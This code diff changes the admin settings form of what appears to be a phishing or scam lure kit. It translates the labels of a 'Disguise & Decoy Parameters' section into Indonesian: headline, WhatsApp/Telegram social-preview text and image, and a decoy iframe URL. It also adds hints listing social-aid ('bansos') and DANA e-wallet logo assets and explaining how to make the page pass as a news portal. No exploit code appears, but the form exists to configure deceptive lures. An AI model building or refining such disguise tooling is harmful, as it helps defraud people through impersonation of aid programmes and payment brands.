@@ -109,7 +109,7 @@
 
         <!-- Disguise & Decoy Parameters -->
         <div class="p-4 sm:p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
-            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-1">Disguise & Social Preview (Classic Template)</h4>
+            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-1">Pengaturan Konten & Preview (Custom Template / Default)</h4>
 
             <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                 <div>
@@ -120,7 +120,7 @@
                 </div>
 
                 <div>
-                    <label for="landing_heading" class="block text-xs font-medium text-zinc-300 mb-1.5">Landing Heading Text</label>
+                    <label for="landing_heading" class="block text-xs font-medium text-zinc-300 mb-1.5">Hero Headline / Judul Utama</label>
                     <input type="text" id="landing_heading" name="landing_heading" 
                            value="{{ old('landing_heading', $settings['landing_heading']) }}"
                            class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
@@ -128,25 +128,28 @@
             </div>
 
             <div>
-                <label for="site_description" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Description (WhatsApp, Discord, Telegram)</label>
+                <label for="site_description" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Description / Ringkasan Artikel</label>
                 <input type="text" id="site_description" name="site_description" 
                        value="{{ old('site_description', $settings['site_description']) }}"
                        class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
             </div>
 
             <div>
-                <label for="og_image_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Image (URL or Relative Asset Path)</label>
+                <label for="og_image_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Image & Banner (URL atau Path Lokal)</label>
                 <input type="text" id="og_image_url" name="og_image_url" 
                        value="{{ old('og_image_url', $settings['og_image_url']) }}"
-                       placeholder="images/landing/bansos-banner.jpg or https://..."
+                       placeholder="images/landing/bansos-banner.jpg atau https://..."
                        class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
+                <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-1">Aset lokal tersedia: <code>images/landing/bansos-banner.jpg</code>, <code>images/landing/bg.jpg</code>, <code>images/landing/dana-logo.png</code>, <code>images/landing/kapan-pulang.jfif</code></p>
             </div>
 
             <div>
-                <label for="decoy_iframe_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Decoy Iframe Website URL (Optional)</label>
+                <label for="decoy_iframe_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Decoy Iframe Website URL <span class="text-zinc-500 font-normal">(Opsional - Bisa Dikosongkan)</span></label>
                 <input type="url" id="decoy_iframe_url" name="decoy_iframe_url" 
                        value="{{ old('decoy_iframe_url', $settings['decoy_iframe_url']) }}"
+                       placeholder="https://... (Biarkan kosong jika tidak ingin menampilkan iframe)"
                        class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs sm:text-sm text-white focus:outline-none focus:border-pink-500">
+                <p class="text-[10px] sm:text-[11px] text-zinc-500 mt-1">Jika dikosongkan, halaman akan tampil bersih sebagai portal berita/artikel mandiri tanpa frame website.</p>
             </div>
         </div>
 
